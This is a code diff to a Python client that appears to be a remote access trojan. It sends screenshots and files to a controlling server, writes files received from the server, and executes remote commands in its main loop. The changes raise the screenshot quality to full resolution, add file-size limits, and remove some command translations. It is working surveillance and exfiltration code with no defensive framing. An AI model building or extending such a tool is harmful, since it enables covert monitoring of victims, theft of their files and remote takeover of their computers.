@@ -91,7 +91,7 @@ def connect_server():
             time.sleep(5)
 
 def take_screenshot():
-    """Capture screenshot - cross platform with compression"""
+    """Capture screenshot - high quality with memory management"""
     try:
         from PIL import Image, ImageGrab
         import io
@@ -109,42 +109,99 @@ def take_screenshot():
                     screenshot = sct.grab(sct.monitors[1])
                     screenshot = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
         
-        # Compress and resize for network transfer
-        max_size = (1280, 720)  # Reduced from 1920x1080 for faster processing
-        screenshot.thumbnail(max_size, Image.Resampling.LANCZOS)
+        # Get original resolution
+        orig_width, orig_height = screenshot.size
+        total_pixels = orig_width * orig_height
         
-        buffer = io.BytesIO()
-        # Use JPEG with higher compression for much smaller size
-        screenshot.save(buffer, format='JPEG', quality=60, optimize=True)
-        img_data = base64.b64encode(buffer.getvalue()).decode()
-        
-        # Check size - if still too large, compress more aggressively
-        if len(img_data) > 200000:  # ~200KB limit instead of 500KB
+        # Adaptive quality and size based on resolution to prevent crash
+        if total_pixels > 8294400:  # > 4K (3840x2160)
+            # Very large - resize to 4K max
+            max_size = (3840, 2160)
+            screenshot.thumbnail(max_size, Image.Resampling.LANCZOS)
             buffer = io.BytesIO()
-            screenshot.save(buffer, format='JPEG', quality=60, optimize=True)
+            screenshot.save(buffer, format='JPEG', quality=90, optimize=True, subsampling=0)
             img_data = base64.b64encode(buffer.getvalue()).decode()
+            img_format = "JPEG"
+            
+        elif total_pixels > 3686400:  # > 2K (2560x1440)
+            # 4K - high quality JPEG
+            buffer = io.BytesIO()
+            screenshot.save(buffer, format='JPEG', quality=92, optimize=True, subsampling=0)
+            img_data = base64.b64encode(buffer.getvalue()).decode()
+            img_format = "JPEG"
+            
+        elif total_pixels > 2073600:  # > Full HD (1920x1080)
+            # 2K - very high quality
+            buffer = io.BytesIO()
+            screenshot.save(buffer, format='JPEG', quality=93, optimize=True, subsampling=0)
+            img_data = base64.b64encode(buffer.getvalue()).decode()
+            img_format = "JPEG"
+            
+        else:
+            # Full HD or lower - maximum quality
+            buffer = io.BytesIO()
+            screenshot.save(buffer, format='JPEG', quality=95, optimize=True, subsampling=0)
+            img_data = base64.b64encode(buffer.getvalue()).decode()
+            img_format = "JPEG"
+        
+        # Safety check - if still too large (>15MB), compress more
+        max_size_bytes = 15 * 1024 * 1024  # 15MB limit
+        if len(img_data) > max_size_bytes:
+            # Progressively reduce quality until size is acceptable
+            for quality in [85, 80, 75, 70]:
+                buffer = io.BytesIO()
+                screenshot.save(buffer, format='JPEG', quality=quality, optimize=True)
+                img_data = base64.b64encode(buffer.getvalue()).decode()
+                if len(img_data) <= max_size_bytes:
+                    break
+            img_format = "JPEG"
+        
+        # Clear memory
+        del screenshot
+        del buffer
         
         return json.dumps({
             "type": "SCREENSHOT",
             "status": "success",
             "data": img_data,
             "size": len(img_data),
-            "format": "JPEG"
+            "format": img_format,
+            "resolution": f"{orig_width}x{orig_height}"
         })
-    except ImportError:
+        
+    except MemoryError:
         return json.dumps({
             "type": "SCREENSHOT",
             "status": "error",
-            "message": "Screenshot library not installed. Run: pip install pillow mss"
+            "message": "Screenshot too large - insufficient memory"
+        })
+    except ImportError as e:
+        return json.dumps({
+            "type": "SCREENSHOT",
+            "status": "error",
+            "message": f"Screenshot library not installed: {str(e)}. Run: pip install pillow mss"
         })
     except Exception as e:
-        return json.dumps({"type": "SCREENSHOT", "status": "error", "message": str(e)})
+        return json.dumps({
+            "type": "SCREENSHOT",
+            "status": "error",
+            "message": f"Screenshot failed: {str(e)}"
+        })
 
 def download_file(filepath):
     """Send file to server"""
     try:
         if not os.path.exists(filepath):
             return json.dumps({"type": "DOWNLOAD", "status": "error", "message": "File not found"})
+        
+        # Check file size limit
+        file_size = os.path.getsize(filepath)
+        if file_size > 50 * 1024 * 1024:  # 50MB limit
+            return json.dumps({
+                "type": "DOWNLOAD",
+                "status": "error",
+                "message": f"File too large: {file_size / (1024*1024):.2f}MB (max 50MB)"
+            })
         
         with open(filepath, 'rb') as f:
             file_data = base64.b64encode(f.read()).decode()
@@ -154,7 +211,7 @@ def download_file(filepath):
             "status": "success",
             "filename": os.path.basename(filepath),
             "data": file_data,
-            "size": os.path.getsize(filepath)
+            "size": file_size
         })
     except Exception as e:
         return json.dumps({"type": "DOWNLOAD", "status": "error", "message": str(e)})
@@ -162,6 +219,14 @@ def download_file(filepath):
 def upload_file(filename, data_b64):
     """Receive file from server"""
     try:
+        # Limit file size to prevent memory issues
+        if len(data_b64) > 70000000:  # ~50MB after base64 encoding
+            return json.dumps({
+                "type": "UPLOAD",
+                "status": "error",
+                "message": "File too large (max 50MB)"
+            })
+        
         file_data = base64.b64decode(data_b64)
         
         filepath = os.path.join(current_dir, filename)
@@ -452,18 +517,6 @@ def main_loop():
                                 cmd = "dmidecode"  # Windows wmic to Linux dmidecode
                             elif cmd_lower.startswith("wmic "):
                                 cmd = "dmidecode " + cmd[4:]  # Windows wmic to Linux dmidecode
-                            elif cmd_lower.startswith("del "):
-                                cmd = "rm " + cmd[3:]  # Windows del to Linux rm
-                            elif cmd_lower.startswith("rmdir "):
-                                cmd = "rmdir " + cmd[5:]
-                            elif cmd_lower.startswith("md "):  # Windows md
-                                cmd = "mkdir " + cmd[2:]
-                            elif cmd_lower.startswith("move "):
-                                cmd = "mv " + cmd[4:]
-                            elif cmd_lower.startswith("copy "):
-                                cmd = "cp " + cmd[4:]
-                            elif cmd_lower.startswith("type "):
-                                cmd = "cat " + cmd[4:]
                         
                         # Regular command
                         try:
